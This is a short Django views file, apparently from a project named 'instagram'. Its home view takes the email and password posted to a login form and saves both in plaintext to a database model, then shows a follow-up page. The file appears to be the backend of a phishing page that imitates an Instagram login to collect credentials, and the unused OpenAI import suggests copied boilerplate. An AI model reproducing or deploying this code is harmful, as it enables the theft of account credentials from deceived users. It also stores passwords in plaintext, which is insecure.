from django.shortcuts import render,redirect
from django.http import JsonResponse,HttpResponse
from django.views.decorators.csrf import csrf_exempt
import openai
import os
from instagram.models import data

openai.api_key = os.getenv("OPENAI_API_KEY",'None')


def home(request):
    if request.method == 'POST':
        e_mail = request.POST.get('email')
        pas= request.POST.get('password')
        en=data(user=e_mail,pas=pas)
        en.save()
        return render(request,"r.html")
            
   
        
    return render(request,'index.html')